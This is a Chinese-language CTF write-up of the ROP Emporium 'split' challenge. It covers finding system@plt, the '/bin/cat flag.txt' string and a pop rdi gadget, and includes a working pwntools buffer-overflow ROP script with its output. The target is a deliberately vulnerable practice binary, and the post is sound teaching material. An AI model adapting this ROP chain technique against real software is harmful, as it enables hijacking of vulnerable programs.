---
title: split
published: 2026-05-15
image: ""
tags: [pwn]
category: pwn
draft: false
series: ROP Emporium
---

# 题目简述

相比于第一题把system()函数和字符串参数都准备好了，调用到目标函数flag就相当于点击即送而言，这道题需要我们自己找到有用参数和目标函数，正如题目的提示。不过我们还是来正常走一遍，**主动搜索信息远比依赖提示来的重要**

# 解题流程

## 工具

pwntools、ropper、rabin2

## 检查二进制文件权限

终端输入指令：

```terminal
pwn checksec ./split
```

得到结果：

```terminal
Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

正如这个专栏的特点般心照不宣

## 寻找有用参数、目标函数和gadget

还记得第一题目标函数里面最关键的函数及其参数吗：

```
system("/bin/cat flag.txt")
```

试下能不能找到呢

```terminal
nm ./split | grep system
```

结果是：

```terminal
                 U system@@GLIBC_2.2.5
```

有意思，这意味着当前这个二进制文件用到了 `system` 函数，但它本身没有定义 `system`，需要运行时从`libc`里动态链接进来。那我们就在反汇编里查看一下它的入口：

```terminal
objdump -d ./split | grep system
```

看到：

```terminal
0000000000400560 <system@plt>:
  400560:       ff 25 ba 0a 20 00       jmp    *0x200aba(%rip)        # 601020 <system@GLIBC_2.2.5>
  40074b:       e8 10 fe ff ff          call   400560 <system@plt>
```

入口到手✔

ps：

主播当时第一次做这道题的时候用的`usefulFunction`这个函数的地址(看这个名字觉得这这是目标函数)，而不是`system@plt`函数地址本身，结果函数里面前面部分有mov edi, "/bin/ls"这样的覆盖参数行为，导致怎么都拿不到flag，而是列出目录。对此，大家也要多加注意

接下来是你了，字符串

```terminal
ropper --file ./split --string "/bin/cat flag.txt"
```

得到：

```terminal
Strings
=======

Address     Value              
-------     -----              
0x00401060  /bin/cat flag.txt
```

完美的字符串

> 但是这道题有个坑点，我先提前讲了

**就是如果你最后拿这个字符串地址去跑脚本，你会发现跑不出来，同时如果你用radare2去看，你会发现**：

```terminal
rabin2 -z ./split

[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

看到最后那个地址了吗，正是我们要找的字符串的地址，而且你会发现，两者除了前面`60和40`的差别，其他都一样

显然，后者最终跑通了，后续的脚本也是用的这个地址展开的



为了在调用函数时以"/bin/cat flag.txt"作为参数，我们就应该想到需要用到`pop rdi`这样的指令来让它进入第一个参数寄存器为函数所用，那就用`ropper`查一查:

```terminal
ropper --file ./split --search "pop rdi"
```

得到：

```terminal
0x00000000004007c3: pop rdi; ret;随手准备ret指令地址备用好习惯
```

养成随手准备`ret`指令地址备用好习惯

```terminal
0x0000000000400542: ret 0x200a; 
0x000000000040053e: ret;
```

~~我现在已经什么都不缺了~~

那接下来便是

## 构造脚本payload

根据我们的脚本模板和思路，这道题的脚本就长这样

```python
from pwn import *

p = process('./split')
p.recv() 

payload = b'A' * 40 + p64(0x00000000004007c3) + p64(0x00601060) + p64(0x0000000000400560)
#从左到右依次是pop rdi;ret、/bin/cat flag.txt、system@plt
p.sendline(payload)
p.interactive()
```

开跑！

```terminal
python3 split.py
```

结果是：

```terminal
[+] Starting local process './split': pid 6528
[*] Switching to interactive mode
Thank you!
[*] Got EOF while reading in interactive
```

第一时间想到是不是又没`栈对齐`，加个`ret`试试呢，要保证`/bin/cat flag.txt`配合`pop rdi`指令进入寄存器，又要保证最后调用到目标函数，以及pop rdi后面紧接着的`ret`，那么这个ret最合适的地方便是`/bin/cat flag.txt`和`system@plt`中间了，于是payload变为：

```python
payload = b'A' * 40 + p64(0x00000000004007c3) + p64(0x00601060) + p64(0x000000000040053e) + p64(0x0000000000400560)
#从左到右依次是pop rdi;ret、/bin/cat flag.txt、ret、system@plt；
```

再跑

```terminal
[*] You have the latest version of Pwntools (4.15.0)
[+] Starting local process './split': pid 6348
[*] Switching to interactive mode
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

flag出来了，完结撒花

# 新知识以及总结思考

+ 参数寄存器`rdi`（第一个），要想让目标函数以我们想要的参数来执行，就得修改它

+ 对于利用函数内的目标函数没有按预期参数执行，应想到函数内部是否有`参数覆盖行为`（如mov edi, "/bin/ls"），这时，应该想到更多时候是去调用`目标函数本身`

+ 此题不是`/bin/sh`，最终目的自然不是接入`shell`，只是让其执行一次命令让目的达成（`/bin/cat flag.txt`），而`interactive() `这种“把 `stdin/stdout `接回终端”的方式会让你误以为接入了终端，所以`interactive() `只是把你的终端和目标进程当前的标准输入/输出直接接上。它不保证对面是 shell`，也不保证对面还会稳定活着

+ 总的来说，我不是拿到了`shell`，而是在`exp`完成后，短暂连着一个**尚未完全退出、或者已经不稳定的普通进程**；因此还能产生像能输入的错觉，**但一旦程序真正退出或崩溃，interactive() 就会报 EOF**
  **或 -11**

+ cpu在没有ret这样的会把下一个该去的地址送给你的指令，会默认执行下一条，这也是为什么**挨在一起的pop rdi和ret能当成一小段gadget来用**

+ 关于system@plt

  **不是所有函数都依赖于栈上变量**，所以在split这题里，我们可以把它看成一个更看重“入口地址正确 + 参数寄存器已就位”的调用入口，而不是一个必须依赖旧`RBP`才能活的东西
  **它更像一个跳板代码**，把控制流导向真正的 system函数，因为这里本质上是跳转（jump）而不是一次新的标准call，所以不会自动为后续执行补上一套规范的返回地址链；因此目标动作完成后，程序常常没有被认真安排好的“优雅退路”，**可能退出、EOF，或者沿着被破坏的栈继续走几步后崩溃**



+ 关于同一个字符串出现两个不同地址的问题

  在`split`题中，我一开始用ropper查到`/bin/cat flag.txt`的地址是`0x401060`，但实际payload中能成功的是`0x601060`。后来才意识到，这里混淆了“文件偏移”和“运行时虚拟地址”

  在这类非PIE ELF中，代码相关区域常见在`0x400000`附近，而`.data/.bss`等可写数据区域常见在`0x600000`附近。`/bin/cat flag.txt`这个字符串实际位于`.data`区域，所以运行时地址应当落在`0x601000`附近，而不是`0x401000`附近

  如果`.data`的文件偏移是`0x1050`，运行时地址是`0x601050`，而字符串在文件里的偏移是`0x1060`，那么它相对于`.data`起点的偏移就是：

  0x1060 - 0x1050 = 0x10

  所以字符串运行时地址应为：

  0x601050 + 0x10 = 0x601060

  这也解释了为什么 `0x601060` 才是正确地址。ROP 链里传给函数的参数应该是程序运行时能访问到的虚拟地址，而不是单纯的文件偏移

  因此，ropper 查 gadget 很方便，但如果用它查字符串时发现地址所在区域看起来感觉不对，应该用`rabin2`、`readelf`或`gdb`的 `x/s 地址` 进行交叉验证
